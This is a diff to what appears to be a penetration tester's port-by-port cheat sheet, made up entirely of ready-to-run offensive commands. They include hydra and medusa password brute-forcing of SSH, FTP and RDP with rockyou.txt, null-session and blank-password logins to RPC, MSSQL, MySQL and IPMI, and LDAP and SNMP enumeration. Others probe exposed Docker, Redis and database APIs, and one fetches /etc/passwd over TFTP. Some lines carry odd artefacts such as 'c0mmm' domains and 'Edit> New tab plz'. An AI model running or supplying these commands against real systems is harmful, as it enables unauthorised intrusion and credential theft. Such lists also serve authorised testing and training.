@@ -23,21 +23,26 @@ qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost ft
 
 ### Port 135 (RPC)
 rpcclient -U "" -N $rhost -c "enumdomusers" #135
+rpcclient -U "" -N $rhost -c "querydispinfo"
 rpcclient -U $shortdomain/$user -N $rhost #135
 rpcclient -U '' -N $rhost #135
 rpcclient -U "" -N $rhost #135
 rpcclient -U''%'' -N $rhost #135
 
 ### Port 22 (SSH)
+ssh-keyscan $rhost
 qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost ssh; exec zsh'" & disown
 medusa -u $user -P ~/rockyou.txt -h $rhost -M ssh #22
 
 ### Port 389 (LDAP)
 jxplorer #389
 nmap -p389 --script "ldap* and not brute" -n -Pn $rhost #389
+Edit> ldapsearch -x -H ldap://$rhost -b "" -s base "(objectclass=*)" #389
 Edit> ldapsearch -x -H "ldap://$rhost" -b "CN=$computer_name,DC=$shortdomain,DC=c0mmm" "objectclass=*" | grep description #389
 Edit> ldapsearch -x -H "ldap://$rhost" -b "DC=$shortdomain,DC=c0mmm" "objectclass=*" | grep description #389
-Edit> New tab plz nmap -p389 --script ldap-brute --script-args ldap.base='"cn=users,dc=$shortdomain,dc=c0mmm"' -Pn $rhost
+Edit> ldapsearch -x -H ldap://$rhost -b "dc=$shortdomain,dc=com" "(objectClass=user)" #389
+Edit> ldapsearch -x -H ldap://$rhost -b "dc=$shortdomain,dc=com" "(objectClass=group)" #389
+Edit> New tab plz nmap -p389 --script ldap-brute --script-args ldap.base='"cn=users,dc=$shortdomain,dc=c0mmm"' -Pn $rhost #389
 
 ### Port 636 (LDAPS)
 # Note: No LDAPS commands were provided in the original list  #636
@@ -78,15 +83,61 @@ cadaver http://$rhost/ITproject #80
 cadaver http://$rhost/maybe-it-cred-requires #80
 
 ### Port 443 (HTTPS)
+curl -k https://$rhost
+sslscan $rhost:443 #443
 wafw00f -v https://$domain #443
+
+### MSSQL (Port 1433)
+sqsh -S $rhost -U sa -P ""
+nmap -sV -p1433 --script ms-sql-info -Pn $rhost
 
 ### Port 3306 (MySQL)
 mysql -u $user -h $rhost #3306 try with no password #3306
 mysql -h $rhost -u "" -p"" #3306
 nmap -sV -p3306 --script mysql-info,mysql-variables -Pn $rhost #3306
+nmap -sV -p3306 --script mysql-databases -Pn $rhost #3306
+
+### PostgreSQL (Port 5432)
+psql -h $rhost -U postgres
 
 ### Port 3389 (RDP)
 qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost rdp; exec zsh'" & disown
 
 ### Port 6379 (Redis)
 redis-cli -h $rhost #6379
+redis-cli -h $rhost keys * #6379
+
+### NFS (Port 2049)
+showmount -e $rhost
+
+### SNMP (Port 161)
+snmpwalk -v1 -c public $rhost #161
+qterminal -e "zsh -c 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $rhost; exec zsh'" & disown
+
+### Elasticsearch (Port 9200)
+curl -s http://$rhost:9200/_cat/indices
+curl -s http://$rhost:9200/_cluster/health
+
+### MongoDB (Port 27017)
+mongo --host $rhost --eval "db.version()"
+mongo --host $rhost --eval "db.getCollectionNames()"
+
+### CouchDB (Port 5984)
+curl -s http://$rhost:5984/_all_dbs
+curl -s http://$rhost:5984/_utils/
+
+### Docker (Port 2375)
+docker -H tcp://$rhost:2375 ps
+docker -H tcp://$rhost:2375 images
+
+### IPMI (Port 623)
+ipmitool -I lanplus -C 0 -H $rhost -U "" -P "" user list (IPMI user enumeration)
+nmap -sU -p623 --script ipmi-version.nse $rhost
+
+### Rsync (Port 873)
+rsync rsync://$rhost
+
+### CoAP (Port 5683)
+coap-client -m get "coap://$rhost:5683/.well-known/core" 
+TFTP (Port 69)
+tftp $rhost → get /etc/passwd
